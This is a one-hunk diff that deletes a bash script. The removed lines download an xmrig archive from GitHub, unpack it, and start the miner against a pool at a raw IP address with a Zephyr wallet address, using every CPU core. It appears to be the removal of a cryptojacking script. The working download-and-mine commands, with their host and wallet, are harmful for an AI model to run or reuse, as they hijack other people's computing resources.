@@ -1,3 +1,1 @@
-#!/bin/bash
-wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
-./xmrig --donate-level 1 -o 103.3.62.75:443 -u ZEPHs7V3pV6FYESjnvZ2gaN3ys7Crrve4UFvYSeUdvgqP6HNKLc3qxQ3SaPvkm5EoXM2c7RGv5QpMDRSYbwt3uy4Mxj2h6gZPC3 -p tes -a rx/0 -t $(nproc --all)
+
